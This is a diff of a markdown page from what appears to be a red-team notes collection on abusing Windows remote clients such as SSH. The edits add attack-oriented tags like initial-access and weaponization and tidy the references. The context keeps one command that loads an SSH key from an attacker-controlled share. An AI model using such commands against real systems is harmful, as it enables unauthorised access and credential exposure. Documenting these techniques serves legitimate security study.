@@ -1,6 +1,15 @@
+---
+author(s):
+  - Userware
+tags:
+  - initial-access
+  - weaponization
+  - client-side-attacks
+  - living-off-the-foreign-land
+  - living-off-the-land
+  - windows
+---
 # Remote Clients
-
-Search Tag(s): #initial-access #living-off-the-foreign-land #living-off-the-land
 
 ## SSH
 
@@ -53,6 +62,8 @@ C:\> ssh -i \\<attacker_IP>\key.pem root@<IP>
 ---
 ## References
 
+### Backlinks
+
 - [[SCP|File Transfer: SCP]]
 
 ### LOLBAS
@@ -65,4 +76,4 @@ C:\> ssh -i \\<attacker_IP>\key.pem root@<IP>
 
 ### RedSiege
 
-- [RedSiege: SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access](https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/)
+- [RedSiege: SSHishing - Abusing Shortcut Files and the Windows SSH Client for Initial Access](https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/)
